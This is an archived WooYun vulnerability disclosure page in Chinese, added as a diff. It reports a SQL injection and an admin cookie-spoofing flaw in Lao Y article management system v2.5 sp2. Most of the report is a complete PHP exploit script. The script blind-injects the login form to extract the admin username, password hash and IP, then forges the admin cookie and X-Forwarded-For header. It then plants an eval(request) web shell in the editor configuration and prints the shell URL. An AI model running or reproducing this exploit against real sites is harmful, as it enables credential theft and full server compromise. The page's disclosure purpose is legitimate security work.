@@ -1,0 +1,602 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		老Y文章管理系统 v2.5 sp2 SQL注射&amp;Cookies欺骗漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		老Y文章管理系统 v2.5 sp2 SQL注射&amp;Cookies欺骗漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2010-09-22 00:12</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2010-09-22：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2010-09-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">老Y文章管理系统 v2.5 sp2的/user/UserLogin.asp文件存在一个SQL注射漏洞，导致恶意用户可以通过漏洞得到数据库的任何数据。另外后台登陆处理不当，导致通过伪造管理账号密码以及管理员IP即可欺骗登陆后台。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">漏洞测试exp:<br />
+<br />
+<br />
+<br />
+&lt;?php<br />
+<br />
+ini_set(&quot;max_execution_time&quot;,0);<br />
+<br />
+error_reporting(7);<br />
+<br />
+function usage()<br />
+<br />
+{<br />
+<br />
+	global $argv;<br />
+<br />
+	exit(<br />
+<br />
+		&quot;\n--+++============================================================+++--&quot;.<br />
+<br />
+        &quot;\n--+++==== &quot;.base64_decode(&quot;wM9ZzsTVwrncwO3Ptc2zdjIuNXNwMiBCbGluZCBTUUwgSW5qZWN0aW9uIEV4cGxvaXQ=&quot;).&quot; ====+++--&quot;.<br />
+<br />
+        &quot;\n--+++============================================================+++--&quot;.<br />
+<br />
+		&quot;\n\n[+] Author   : My5t3ry&quot;.<br />
+<br />
+		&quot;\n[+] Team     : http://www.t00ls.net&quot;.<br />
+<br />
+		&quot;\n[+] Blog     : http://www.bksec.net&quot;.<br />
+<br />
+		&quot;\n[+] Usage    : php &quot;.$argv[0].&quot; &lt;hostname&gt; &lt;path&gt;&quot;.<br />
+<br />
+		&quot;\n[+] Ex.      : php &quot;.$argv[0].&quot; localhost /&quot;.<br />
+<br />
+		&quot;\n\n&quot;);<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+function query($pos, $chr, $chs)<br />
+<br />
+{<br />
+<br />
+	switch ($chs){<br />
+<br />
+		case 1:<br />
+<br />
+	        $query = &quot;admin&#039; or 1=1 and (select asc(mid(Admin_Name,{$pos},1)) from [Yao_Admin] where id=1)={$chr} and &#039;1&#039;=&#039;1&quot;;<br />
+<br />
+		break;<br />
+<br />
+		case 2:<br />
+<br />
+			$query = &quot;admin&#039; or 1=1 and (select asc(mid(Admin_Pass,{$pos},1)) from [Yao_Admin] where id=1)={$chr} and &#039;1&#039;=&#039;1&quot;;<br />
+<br />
+		break;<br />
+<br />
+		case 3:<br />
+<br />
+			$query = &quot;admin&#039; or 1=1 and (select len(Admin_Name) from [Yao_Admin] where id=1)={$pos} and &#039;1&#039;=&#039;1&quot;;<br />
+<br />
+		break;<br />
+<br />
+		case 4:<br />
+<br />
+			$query = &quot;admin&#039; or 1=1 and (select asc(mid(Admin_IP,{$pos},1)) from [Yao_Admin] where id=1)={$chr} and &#039;1&#039;=&#039;1&quot;;<br />
+<br />
+		break;<br />
+<br />
+		case 5:<br />
+<br />
+			$query = &quot;admin&#039; or 1=1 and (select len(Admin_IP) from [Yao_Admin] where id=1)={$pos} and &#039;1&#039;=&#039;1&quot;;<br />
+<br />
+		break;<br />
+<br />
+	}<br />
+<br />
+	$query = urlencode($query);<br />
+<br />
+	return $query;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+function exploit($hostname, $path, $pos, $chr, $chs)<br />
+<br />
+{<br />
+<br />
+	$chr = ord($chr);<br />
+<br />
+	$conn = fsockopen($hostname, 80);<br />
+<br />
+	if (!$conn){<br />
+<br />
+		exit(&quot;\r\n[-] No response from $conn&quot;);<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	$postdata = &quot;Username=&quot;.query($pos, $chr, $chs).&quot;&amp;PassWord=aaaaaa&amp;Submit=%B5%C7%C2%BC&quot;;<br />
+<br />
+	$message = &quot;POST &quot;.$path.&quot;User/Userlogin.asp?action=login HTTP/1.1\r\n&quot;;<br />
+<br />
+	$message .= &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;<br />
+<br />
+	$message .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+<br />
+	$message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;<br />
+<br />
+	$message .= &quot;Accept-Encoding: gzip, deflate\r\n&quot;;<br />
+<br />
+	$message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;<br />
+<br />
+	$message .= &quot;Host: $hostname\r\n&quot;;<br />
+<br />
+	$message .= &quot;Content-Length: &quot;.strlen($postdata).&quot;\r\n&quot;;<br />
+<br />
+	$message .= &quot;Cookie: ASPSESSIONIDSSCTBRDD=ILJJFNOABJJHHDMPDBAEJIGC\r\n&quot;;<br />
+<br />
+	$message .= &quot;Connection: Close\r\n\r\n&quot;;<br />
+<br />
+	$message .= $postdata;<br />
+<br />
+<br />
+<br />
+	fputs($conn, $message);<br />
+<br />
+	while (!feof($conn))<br />
+<br />
+		$reply .= fgets($conn, 1024);<br />
+<br />
+<br />
+<br />
+	fclose($conn);<br />
+<br />
+	return $reply;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+function crkusername($hostname, $path, $chs)<br />
+<br />
+{<br />
+<br />
+	global $length,$user;<br />
+<br />
+	$key = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;;<br />
+<br />
+	$chr = 0;<br />
+<br />
+	$pos = 1;<br />
+<br />
+	echo &quot;[+] username: &quot;;<br />
+<br />
+	while ($pos &lt;= $length)<br />
+<br />
+	{<br />
+<br />
+		$response = exploit($hostname, $path, $pos, $key[$chr], $chs);<br />
+<br />
+		preg_match(&#039;/Set-Cookie:\s([A-Za-z]{3})=ID=/&#039;,$response,$match);<br />
+<br />
+<br />
+<br />
+        if (strlen(trim($match[1])) != 0)<br />
+<br />
+		{<br />
+<br />
+			$user .= $key[$chr];<br />
+<br />
+			echo $key[$chr];<br />
+<br />
+			$chr = 0;<br />
+<br />
+			$pos++;<br />
+<br />
+		}<br />
+<br />
+		else<br />
+<br />
+			$chr++;<br />
+<br />
+	}<br />
+<br />
+	echo &quot;\n&quot;;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+function crkpassword($hostname, $path, $chs)<br />
+<br />
+{<br />
+<br />
+	global $pass;<br />
+<br />
+	$key = &quot;abcdef0123456789&quot;;<br />
+<br />
+	$chr = 0;<br />
+<br />
+	$pos = 1;<br />
+<br />
+	echo &quot;[+] password: &quot;;<br />
+<br />
+	while ($pos &lt;= 18)<br />
+<br />
+	{<br />
+<br />
+		$response = exploit($hostname, $path, $pos, $key[$chr], $chs);<br />
+<br />
+		preg_match(&#039;/Set-Cookie:\s([A-Za-z]{3})=ID=/&#039;,$response,$match);<br />
+<br />
+<br />
+<br />
+        if (strlen(trim($match[1])) != 0)<br />
+<br />
+		{<br />
+<br />
+			$pass .= $key[$chr];<br />
+<br />
+			echo $key[$chr];<br />
+<br />
+			$chr = 0;<br />
+<br />
+			$pos++;<br />
+<br />
+		}<br />
+<br />
+		else<br />
+<br />
+			$chr++;<br />
+<br />
+	}<br />
+<br />
+	echo &quot;\n&quot;;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+function lengthcolumns($hostname, $path, $chs)<br />
+<br />
+{<br />
+<br />
+	$exit = 0;<br />
+<br />
+	$length = 0;<br />
+<br />
+	$pos = 1;<br />
+<br />
+	$chr = 0;<br />
+<br />
+	while ($exit==0)<br />
+<br />
+	{<br />
+<br />
+		$response = exploit($hostname, $path, $pos, $chr, $chs);<br />
+<br />
+		preg_match(&#039;/Set-Cookie:\s([A-Za-z]{3})=ID=/&#039;,$response,$match);<br />
+<br />
+<br />
+<br />
+		if (strlen(trim($match[1])) != 0)<br />
+<br />
+		{<br />
+<br />
+			$exit = 1;<br />
+<br />
+			$length = $pos;<br />
+<br />
+		}<br />
+<br />
+		else<br />
+<br />
+			$pos++;<br />
+<br />
+		    if($pos==20)<br />
+<br />
+				exit(&quot;\r\n[+] Exploit Failed.\r\n&quot;);<br />
+<br />
+	}<br />
+<br />
+	return $length;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+function crkadminip($hostname, $path, $chs)<br />
+<br />
+{<br />
+<br />
+	global $iplength,$adminip;<br />
+<br />
+	$key = &quot;1234567890.&quot;;<br />
+<br />
+	$chr = 0;<br />
+<br />
+	$pos = 1;<br />
+<br />
+	echo &quot;[+] adminip: &quot;;<br />
+<br />
+	while ($pos &lt;= $iplength)<br />
+<br />
+	{<br />
+<br />
+		$response = exploit($hostname, $path, $pos, $key[$chr], $chs);<br />
+<br />
+		preg_match(&#039;/Set-Cookie:\s([A-Za-z]{3})=ID=/&#039;,$response,$match);<br />
+<br />
+<br />
+<br />
+        if (strlen(trim($match[1])) != 0)<br />
+<br />
+		{<br />
+<br />
+			$adminip .= $key[$chr];<br />
+<br />
+			echo $key[$chr];<br />
+<br />
+			$chr = 0;<br />
+<br />
+			$pos++;<br />
+<br />
+		}<br />
+<br />
+		else<br />
+<br />
+			$chr++;<br />
+<br />
+	}<br />
+<br />
+	echo &quot;\n&quot;;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+function getshell($hostname, $path, $user, $pass, $adminip)<br />
+<br />
+{<br />
+<br />
+	$conn = fsockopen($hostname, 80);<br />
+<br />
+<br />
+<br />
+	if (!$conn){<br />
+<br />
+		exit(&quot;\r\n[-] No response from $conn&quot;);<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	$postdata = &quot;d_name=user&amp;d_initmode=EDIT&amp;d_fixwidth=&amp;d_skin=light1&amp;d_width=500&amp;d_height=300&amp;d_stateflag=1&amp;d_sbedit=1&amp;d_sbview=1&amp;d_detectfromword=1&amp;d_autoremote=0&amp;d_showborder=0&amp;d_entermode=1&amp;d_areacssmode=0&amp;d_memo=500px%BF%ED%B6%C8%BD%E7%C3%E6%CF%C2%B5%C4%D7%EE%BC%F2%B9%A4%BE%DF%C0%B8%B0%B4%C5%A5%2C%CA%CA%BA%CF%D3%DA%D3%CA%BC%FE%CF%B5%CD%B3%C1%F4%D1%D4%CF%B5%CD%B3%B5%C8%D6%BB%D0%E8%D7%EE%BC%F2%B5%A5%B9%A6%C4%DC%B5%C4%D3%A6%D3%C3&amp;d_uploadobject=0&amp;d_autodir=2&amp;d_allowbrowse=0&amp;d_cusdirflag=0&amp;d_baseurl=1&amp;d_uploaddir=..%2Fuploadfiles%2F&amp;d_basehref=&amp;d_contentpath=&amp;d_imageext=gif%7Cjpg%7Cjpeg%7Cbmp%7C%22%3Aeval%28request%28%22my%22%29%29%27&amp;d_imagesize=0&amp;d_flashext=swf&amp;d_flashsize=0&amp;d_mediaext=rm%7Cmp3%7Cwav%7Cmid%7Cmidi%7Cra%7Cavi%7Cmpg%7Cmpeg%7Casf%7Casx%7Cwma%7Cmov&amp;d_mediasize=0&amp;d_fileext=rar%7Czip%7Cpdf%7Cdoc%7Cxls%7Cppt%7Cchm%7Chlp&amp;d_filesize=0&amp;d_remoteext=gif%7Cjpg%7Cbmp&amp;d_remotesize=0&amp;d_localext=gif%7Cjpg%7Cbmp%7Cwmz%7Cpng&amp;d_localsize=0&amp;d_sltsyobject=0&amp;d_sltsyext=jpg%7Cjpeg&amp;d_sltflag=0&amp;d_sltminsize=300&amp;d_sltoksize=120&amp;d_sywzflag=0&amp;d_sywzminwidth=100&amp;d_sywzminheight=100&amp;d_sytext=%B0%E6%C8%A8%CB%F9%D3%D0...&amp;d_syfontcolor=000000&amp;d_syshadowcolor=FFFFFF&amp;d_syshadowoffset=1&amp;d_syfontsize=12&amp;d_syfontname=%CB%CE%CC%E5&amp;d_sywzposition=1&amp;d_sywzpaddingh=5&amp;d_sywzpaddingv=5&amp;d_sywztextwidth=66&amp;d_sywztextheight=17&amp;d_sytpflag=0&amp;d_sytpminwidth=100&amp;d_sytpminheight=100&amp;d_sytpposition=1&amp;d_sytppaddingh=5&amp;d_sytppaddingv=5&amp;d_sypicpath=&amp;d_sytpopacity=1&amp;d_sytpimagewidth=88&amp;d_sytpimageheight=31&quot;;<br />
+<br />
+<br />
+<br />
+	$message = &quot;POST &quot;.$path.&quot;Admin/EditorAdmin/style.asp?action=StyleSetSave&amp;id=2 HTTP/1.1\r\n&quot;;<br />
+<br />
+	$message .= &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;<br />
+<br />
+	$message .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+<br />
+	$message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;<br />
+<br />
+	$message .= &quot;Accept-Encoding: gzip, deflate\r\n&quot;;<br />
+<br />
+	$message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;<br />
+<br />
+	$message .= &quot;Host: $hostname\r\n&quot;;<br />
+<br />
+	$message .= &quot;X-FORWARDED-FOR: &quot;.$adminip.&quot;\r\n&quot;;<br />
+<br />
+	$message .= &quot;Cookie: ASPSESSIONIDCADSSCQQ=OKLJGOECENDGHDLAKKIKBCAB; LaoYAdmin=UserName=&quot;.$user.&quot;&amp;UserPass=&quot;.$pass.&quot;&amp;UserID=1\r\n&quot;;<br />
+<br />
+	$message .= &quot;Content-Length: &quot;.strlen($postdata).&quot;\r\n&quot;;<br />
+<br />
+	$message .= &quot;Connection: Close\r\n\r\n&quot;;<br />
+<br />
+	$message .= $postdata;<br />
+<br />
+<br />
+<br />
+	fputs($conn, $message);<br />
+<br />
+	while (!feof($conn))<br />
+<br />
+		$reply .= fgets($conn, 1024);<br />
+<br />
+<br />
+<br />
+	fclose($conn);<br />
+<br />
+	return $reply;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+if ($argc != 3)<br />
+<br />
+	usage();<br />
+<br />
+$hostname = $argv[1];<br />
+<br />
+$path = $argv[2];<br />
+<br />
+echo &quot;[+] Len(username): &quot;;<br />
+<br />
+$length = lengthcolumns($hostname, $path, 3);<br />
+<br />
+echo $length.&quot;\n&quot;;<br />
+<br />
+echo &quot;[+] Len(adminip): &quot;;<br />
+<br />
+$iplength = lengthcolumns($hostname, $path, 5);<br />
+<br />
+echo $iplength.&quot;\n&quot;;<br />
+<br />
+crkusername($hostname, $path, 1);<br />
+<br />
+crkpassword($hostname, $path, 2);<br />
+<br />
+crkadminip($hostname, $path, 4);<br />
+<br />
+$reply = getshell($hostname, $path, $user, $pass, $adminip);<br />
+<br />
+if(eregi(chr(209).chr(249).chr(202).chr(189).chr(208).chr(222).chr(184).chr(196).chr(179).chr(201).chr(185).chr(166),$reply))<br />
+<br />
+{<br />
+<br />
+	echo &quot;[+] Exploit finished.\r\n&quot;;<br />
+<br />
+	echo &quot;[+] shell:http://&quot;.$hostname.&quot;/Editor/asp/config.asp?my=response.write(now())\r\n&quot;;<br />
+<br />
+}<br />
+<br />
+else<br />
+<br />
+{<br />
+<br />
+	echo &quot;[-] Exploit failed.\r\n&quot;;<br />
+<br />
+}<br />
+<br />
+?&gt;<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">等待官方补丁 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-0585" title="老Y文章管理系统 v2.5 sp2 SQL注射&amp;Cookies欺骗漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：8 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="585";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
